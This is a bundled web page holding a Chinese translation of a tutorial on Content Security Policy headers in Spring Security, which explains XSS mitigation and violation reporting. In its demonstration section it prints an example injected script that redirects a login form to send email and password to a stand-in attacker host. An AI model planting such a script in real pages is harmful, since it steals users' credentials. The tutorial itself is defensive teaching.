import{_ as t}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as e,o as i,a as n}from"./app-D0vunQyr.js";const a={},r=n('<hr><h1 id="spring-security中的内容安全策略" tabindex="-1"><a class="header-anchor" href="#spring-security中的内容安全策略"><span>Spring Security中的内容安全策略</span></a></h1><p>如果你正在处理Spring Security（特别是OAuth）实现，一定要看看《Learn Spring Security》课程。</p><h2 id="_1-概述" tabindex="-1"><a class="header-anchor" href="#_1-概述"><span>1. 概述</span></a></h2><p>跨站脚本攻击（XSS）始终排在最普遍的网络攻击前十名。XSS攻击发生在Web服务器未验证或编码用户的恶意输入并将其呈现在页面上时。像XSS攻击一样，代码注入和点击劫持通过窃取用户数据和冒充用户，在Web应用程序中造成混乱。</p><p>在本教程中，我们将学习如何使用内容安全策略（CSP）头来减轻基于Spring Security的Web应用程序中的代码注入风险。</p><p><strong>内容安全策略（CSP）是一个HTTP响应头，可以显著减少现代浏览器中的代码注入攻击，如XSS、点击劫持等。</strong></p><p>Web服务器通过内容安全策略头指定浏览器可以呈现的资源白名单。这些资源可能是浏览器呈现的任何内容，例如CSS、JavaScript、图像等。</p><p>该头的语法如下：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>Content-Security-Policy: `````&lt;指令&gt;`````; `````&lt;指令&gt;`````; `````&lt;指令&gt;`````; ...\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>此外，我们可以将此策略作为HTML页面的<code>&lt;meta&gt;</code>标签的一部分设置：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;`````&lt;指令&gt;`````;`````&lt;指令&gt;`````;`````&lt;指令&gt;`````; ...&quot;&gt;\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>此外，每个指令都包含一个键和多个值。可以有多个指令，每个指令由分号（;）分隔：</strong></p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>Content-Security-Policy: script-src &#39;self&#39; https://baeldung.com; style-src &#39;self&#39;;\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在这个例子中，我们有两个指令（script-src和style-src），指令script-src有两个值（&#39;self&#39;和https://baeldung.com）。</p><h2 id="_3-漏洞演示" tabindex="-1"><a class="header-anchor" href="#_3-漏洞演示"><span>3. 漏洞演示</span></a></h2><p>现在，让我们看一个例子，了解XSS和代码注入漏洞有多严重。</p><h3 id="_3-1-登录表单" tabindex="-1"><a class="header-anchor" href="#_3-1-登录表单"><span>3.1. 登录表单</span></a></h3><p>通常，在Web应用程序中，在会话超时后，我们会将用户重定向到登录页面。标准登录表单具有用户名/密码字段和提交按钮：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>`&lt;span&gt;`会话超时。请登录。`&lt;/span&gt;`\n`&lt;form id=&quot;login&quot; action=&quot;/login&quot;&gt;`\n    `&lt;input type=&quot;email&quot; class=&quot;form-control&quot; id=&quot;email&quot;&gt;`\n    `&lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot;&gt;`\n    `&lt;button type=&quot;submit&quot;&gt;`登录`&lt;/button&gt;`\n`&lt;/form&gt;`\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_3-2-代码注入" tabindex="-1"><a class="header-anchor" href="#_3-2-代码注入"><span>3.2. 代码注入</span></a></h3><p>用户可以通过表单字段在提供用户输入时注入可疑代码。例如，假设注册表单中的一个文本框接受用户名。</p><p>而不是用户名，用户可以输入<code>&lt;script&gt;``alert(&quot;this is not expected&quot;)``&lt;/script&gt;</code>并提交表单。随后，当表单显示用户名时，它执行了脚本（在这种情况下显示一个消息）。脚本甚至可以加载外部脚本，可能会造成更严重的伤害。</p><p>类似地，假设我们有验证不足的表单字段。再次，用户利用这一点，将恶意JavaScript代码注入到DOM（文档对象模型）中：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>``&lt;script&gt;``\n    let form = document.forms.login;\n    form.action = &quot;https://youaredoomed.com:9090/collect?u=&quot; + document.getElementById(&#39;email&#39;).value + &quot;&amp;p=&quot; + document.getElementById(&#39;password&#39;).value;\n``&lt;/script&gt;``\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这段注入的JavaScript代码在点击登录按钮时将用户重定向到恶意网站。</p><p>当一个毫无戒心的用户提交表单时，他被重定向到https://youaredoomed.com，他的凭证被暴露了。</p><h3 id="_3-3-演示" tabindex="-1"><a class="header-anchor" href="#_3-3-演示"><span>3.3. 演示</span></a></h3><p>让我们看看这种漏洞的实际效果。</p><p>通常，在会话超时后，服务器会将用户重定向到登录页面输入他的凭证。但是，注入的恶意代码将用户重定向到一个意外的网站，并带有用户的凭证：</p><h2 id="_4-spring-security" tabindex="-1"><a class="header-anchor" href="#_4-spring-security"><span>4. Spring Security</span></a></h2><p>在这一部分，让我们讨论如何减轻这些代码注入漏洞。</p><h3 id="_4-1-html-meta标签" tabindex="-1"><a class="header-anchor" href="#_4-1-html-meta标签"><span>4.1. HTML meta标签</span></a></h3><p>在前面的例子中添加内容安全策略头将阻止向恶意服务器提交表单。那么，让我们使用<code>&lt;meta&gt;</code>标签添加这个头，并检查行为：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>`&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;form-action &#39;self&#39;;&quot;&gt;`\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>添加上述meta标签防止浏览器向其他来源提交表单：</p><figure><img src="https://www.baeldung.com/wp-content/uploads/2021/12/csp-1-2-1024x491-1.png" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p><strong>尽管meta标签可以减轻XSS和代码注入攻击，但它们的功能有限。例如，我们不能使用meta标签报告内容安全策略违规。</strong></p><p>因此，让我们利用Spring Security的力量，通过设置内容安全策略头来减轻这些风险。</p><h3 id="_4-2-maven依赖项" tabindex="-1"><a class="header-anchor" href="#_4-2-maven依赖项"><span>4.2. Maven依赖项</span></a></h3><p>首先，让我们将Spring Security和Spring Web依赖项添加到我们的pom.xml中：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>``&lt;dependency&gt;``\n    ``&lt;groupId&gt;``org.springframework.boot``&lt;/groupId&gt;``\n    ``&lt;artifactId&gt;``spring-boot-starter-security``&lt;/artifactId&gt;``\n``&lt;/dependency&gt;``\n``&lt;dependency&gt;``\n    ``&lt;groupId&gt;``org.springframework.boot``&lt;/groupId&gt;``\n    ``&lt;artifactId&gt;``spring-boot-starter-web``&lt;/artifactId&gt;``\n``&lt;/dependency&gt;``\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_4-3-配置" tabindex="-1"><a class="header-anchor" href="#_4-3-配置"><span>4.3. 配置</span></a></h3><p>接下来，让我们通过创建SecurityFilterChain bean来定义Spring Security配置：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>@Configuration\npublic class ContentSecurityPolicySecurityConfiguration {\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http.headers(Customizer.withDefaults())\n            .xssProtection(Customizer.withDefaults())\n            .contentSecurityPolicy(contentSecurityPolicyConfig -&gt; contentSecurityPolicyConfig.policyDirectives(&quot;form-action &#39;self&#39;&quot;));\n        return http.build();\n    }\n}\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在这里，我们声明了contentSecurityPolicy以将表单操作限制为同一来源。</p><h3 id="_4-4-内容安全策略响应头" tabindex="-1"><a class="header-anchor" href="#_4-4-内容安全策略响应头"><span>4.4. 内容安全策略响应头</span></a></h3><p>有了必要的配置，让我们验证Spring Security提供的安全性。为此，让我们打开浏览器的开发者工具（按F12或类似键），点击网络选项卡，并打开URL http://localhost:8080：</p><figure><img src="https://www.baeldung.com/wp-content/uploads/2021/12/csp-2-1-1024x494-1.png" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p>现在，我们将填写表单并提交：</p><figure><img src="https://www.baeldung.com/wp-content/uploads/2021/12/csp-3-1-1024x436-1.png" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p><strong>有了内容安全策略头，浏览器阻止了提交请求，减轻了泄露凭证的风险。</strong></p><p>同样，我们可以配置Spring Security以支持不同的指令。例如，这段代码指定浏览器只从同一来源加载脚本：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>.contentSecurityPolicy(&quot;script-src &#39;self&#39;&quot;);\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>同样，我们可以指示浏览器只从同一来源和somecdn.css.com下载CSS：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>.contentSecurityPolicy(&quot;style-src &#39;self&#39; somecdn.css.com&quot;);\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>此外，我们可以在内容安全策略头中组合任意数量的指令。例如，要限制CSS、JS和表单操作，我们可以指定：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>.contentSecurityPolicy(&quot;style-src &#39;self&#39; somecdn.css.com; script-src &#39;self&#39;; form-action &#39;self&#39;&quot;);\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="_4-5-报告" tabindex="-1"><a class="header-anchor" href="#_4-5-报告"><span>4.5. 报告</span></a></h3><p>除了命令浏览器阻止恶意内容外，服务器还可以要求浏览器在阻止内容时发送报告。那么，让我们将report-uri指令与其他指令结合使用，以便浏览器在每次内容被阻止时发送POST。</p><p>浏览器将以下内容发布report-uri中定义的URL：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>{\n    &quot;csp-report&quot;: {\n{        &quot;blocked-uri&quot;: &quot;&quot;}\n{        &quot;document-uri&quot;: &quot;&quot;}\n{        &quot;original-policy&quot;: &quot;&quot;}\n{        &quot;referrer&quot;: &quot;&quot;}\n{        &quot;violated-directive&quot;: &quot;&quot;}\n    }\n}\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>因此，我们需要定义一个API来接收浏览器发送的违规报告，并记录请求以示例和清晰。</p><p><strong>我们应该注意到，尽管report-uri指令已弃用，转而使用report-to，但大多数浏览器在日期上不支持report-to。</strong> 因此，我们将使用report-uri和report-to指令进行报告。</p><p>首先，让我们更新我们的Spring Security配置：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>String REPORT_TO = &quot;{\\\\&quot;group\\\\&quot;:\\\\&quot;csp-violation-report\\\\&quot;,\\\\&quot;max_age\\\\&quot;:2592000,\\\\&quot;endpoints\\\\&quot;:[{\\\\&quot;url\\\\&quot;:\\\\&quot;https://localhost:8080/report\\\\&quot;}]}&quot;;\n\nhttp.csrf(AbstractHttpConfigurer::disable)\n    .authorizeHttpRequests(authorizationManagerRequestMatcherRegistry -&gt; authorizationManagerRequestMatcherRegistry.requestMatchers(&quot;/**&quot;).permitAll())\n    .headers(httpSecurityHeadersConfigurer -&gt;\n                httpSecurityHeadersConfigurer\n                       .addHeaderWriter(new StaticHeadersWriter(&quot;Report-To&quot;, REPORT_TO))\n                       .xssProtection(Customizer.withDefaults())\n                       .contentSecurityPolicy(contentSecurityPolicyConfig -&gt;\n                               contentSecurityPolicyConfig.policyDirectives(&quot;form-action &#39;self&#39;; report-uri /report; report-to csp-violation-report&quot;)));\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我们首先定义了一个名为csp-violation-report的report-to组，并关联了一个端点。接下来，在.contentSecurityPolicy中，我们使用这个组名作为report-to指令的值。</p><p>现在，当我们在浏览器中打开页面时，我们会看到：</p><figure><img src="https://www.baeldung.com/wp-content/uploads/2021/12/csp-4-1024x512-1.png" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p>接下来，让我们填写表单并点击登录按钮。正如预期的那样，浏览器阻止了请求并向服务器控制台发送了一个报告，类似于：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>Report: {&quot;csp-report&quot;:{&quot;blocked-uri&quot;:&quot;https://youaredoomed.com:9090/collect?u=jhon.doe@mail.com&amp;p=password&quot;,&quot;document-uri&quot;:&quot;https://localhost:8080/&quot;,&quot;original-policy&quot;:&quot;form-action &#39;self&#39;; report-uri https://localhost:8080/report&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;violated-directive&quot;:&quot;form-action&quot;}}\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>以下是格式化后的JSON报告：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>{\n    &quot;csp-report&quot;: {\n{        &quot;blocked-uri&quot;: &quot;https://youaredoomed.com:9090/collect?u=jhon.doe@mail.com&amp;p=password&quot;}\n{        &quot;document-uri&quot;: &quot;https://localhost:8080/&quot;}\n{        &quot;original-policy&quot;: &quot;form-action &#39;self&#39;; report-uri https://localhost:8080/report&quot;}\n{        &quot;referrer&quot;: &quot;&quot;}\n{        &quot;violated-directive&quot;: &quot;form-action&quot;}\n    }\n}\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_5-结论" tabindex="-1"><a class="header-anchor" href="#_5-结论"><span>5. 结论</span></a></h2><p>在本文中，我们看到了如何保护我们的Web应用程序免受点击劫持、代码注入和XSS攻击。</p><p>虽然没有完全防护这些攻击的方法，但内容安全策略头有助于减轻这些攻击的大部分。值得注意的是，截至日期，大多数现代浏览器并不完全支持这个头。因此，设计和构建具有坚实安全原则和标准的应用程序至关重要。</p><p>如常，完整的源代码可在GitHub上获得。</p><p><img src="https://www.baeldung.com/wp-content/themes/baeldung/icon/logo.svg" alt="img" loading="lazy"> OK</p>',78),o=[r];function l(s,c){return i(),e("div",null,o)}const p=t(a,[["render",l],["__file","2024-07-23-Content Security Policy with Spring Security.html.vue"]]),g=JSON.parse('{"path":"/posts/baeldung/2024-07-23/2024-07-23-Content%20Security%20Policy%20with%20Spring%20Security.html","title":"Spring Security中的内容安全策略","lang":"zh-CN","frontmatter":{"date":"2022-04-01T00:00:00.000Z","category":["Spring Security","Content Security Policy"],"tag":["XSS","Code Injection","Clickjacking"],"head":[["meta",{"name":"keywords","content":"Spring Security, Content Security Policy, XSS, Code Injection, Clickjacking"}],["meta",{"name":"description","content":"学习如何在基于Spring Security的Web应用程序中使用内容安全策略头来减轻代码注入风险。"}],["meta",{"property":"og:url","content":"https://www.kahen.xyz/posts/baeldung/2024-07-23/2024-07-23-Content%20Security%20Policy%20with%20Spring%20Security.html"}],["meta",{"property":"og:site_name","content":"Baeldung 中文网"}],["meta",{"property":"og:title","content":"Spring Security中的内容安全策略"}],["meta",{"property":"og:description","content":"Spring Security中的内容安全策略 如果你正在处理Spring Security（特别是OAuth）实现，一定要看看《Learn Spring Security》课程。 1. 概述 跨站脚本攻击（XSS）始终排在最普遍的网络攻击前十名。XSS攻击发生在Web服务器未验证或编码用户的恶意输入并将其呈现在页面上时。像XSS攻击一样，代码注入和点..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://www.baeldung.com/wp-content/uploads/2021/12/csp-1-2-1024x491-1.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2024-07-23T06:17:45.000Z"}],["meta",{"property":"article:author","content":"Kahen"}],["meta",{"property":"article:tag","content":"XSS"}],["meta",{"property":"article:tag","content":"Code Injection"}],["meta",{"property":"article:tag","content":"Clickjacking"}],["meta",{"property":"article:published_time","content":"2022-04-01T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2024-07-23T06:17:45.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Spring Security中的内容安全策略\\",\\"image\\":[\\"https://www.baeldung.com/wp-content/uploads/2021/12/csp-1-2-1024x491-1.png\\",\\"https://www.baeldung.com/wp-content/uploads/2021/12/csp-2-1-1024x494-1.png\\",\\"https://www.baeldung.com/wp-content/uploads/2021/12/csp-3-1-1024x436-1.png\\",\\"https://www.baeldung.com/wp-content/uploads/2021/12/csp-4-1024x512-1.png\\",\\"https://www.baeldung.com/wp-content/themes/baeldung/icon/logo.svg\\"],\\"datePublished\\":\\"2022-04-01T00:00:00.000Z\\",\\"dateModified\\":\\"2024-07-23T06:17:45.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"Kahen\\",\\"url\\":\\"https://www.kahen.xyz\\"}]}"]],"description":"Spring Security中的内容安全策略 如果你正在处理Spring Security（特别是OAuth）实现，一定要看看《Learn Spring Security》课程。 1. 概述 跨站脚本攻击（XSS）始终排在最普遍的网络攻击前十名。XSS攻击发生在Web服务器未验证或编码用户的恶意输入并将其呈现在页面上时。像XSS攻击一样，代码注入和点..."},"headers":[{"level":2,"title":"1. 概述","slug":"_1-概述","link":"#_1-概述","children":[]},{"level":2,"title":"3. 漏洞演示","slug":"_3-漏洞演示","link":"#_3-漏洞演示","children":[{"level":3,"title":"3.1. 登录表单","slug":"_3-1-登录表单","link":"#_3-1-登录表单","children":[]},{"level":3,"title":"3.2. 代码注入","slug":"_3-2-代码注入","link":"#_3-2-代码注入","children":[]},{"level":3,"title":"3.3. 演示","slug":"_3-3-演示","link":"#_3-3-演示","children":[]}]},{"level":2,"title":"4. Spring Security","slug":"_4-spring-security","link":"#_4-spring-security","children":[{"level":3,"title":"4.1. HTML meta标签","slug":"_4-1-html-meta标签","link":"#_4-1-html-meta标签","children":[]},{"level":3,"title":"4.2. Maven依赖项","slug":"_4-2-maven依赖项","link":"#_4-2-maven依赖项","children":[]},{"level":3,"title":"4.3. 配置","slug":"_4-3-配置","link":"#_4-3-配置","children":[]},{"level":3,"title":"4.4. 内容安全策略响应头","slug":"_4-4-内容安全策略响应头","link":"#_4-4-内容安全策略响应头","children":[]},{"level":3,"title":"4.5. 报告","slug":"_4-5-报告","link":"#_4-5-报告","children":[]}]},{"level":2,"title":"5. 结论","slug":"_5-结论","link":"#_5-结论","children":[]}],"git":{"createdTime":1721715465000,"updatedTime":1721715465000,"contributors":[{"name":"Kahen","email":"Kahen@users.noreply.github.com","commits":1}]},"readingTime":{"minutes":6.87,"words":2060},"filePathRelative":"posts/baeldung/2024-07-23/2024-07-23-Content Security Policy with Spring Security.md","localizedDate":"2022年4月1日","excerpt":"<hr>\\n<h1>Spring Security中的内容安全策略</h1>\\n<p>如果你正在处理Spring Security（特别是OAuth）实现，一定要看看《Learn Spring Security》课程。</p>\\n<h2>1. 概述</h2>\\n<p>跨站脚本攻击（XSS）始终排在最普遍的网络攻击前十名。XSS攻击发生在Web服务器未验证或编码用户的恶意输入并将其呈现在页面上时。像XSS攻击一样，代码注入和点击劫持通过窃取用户数据和冒充用户，在Web应用程序中造成混乱。</p>\\n<p>在本教程中，我们将学习如何使用内容安全策略（CSP）头来减轻基于Spring Security的Web应用程序中的代码注入风险。</p>","autoDesc":true}');export{p as comp,g as data};
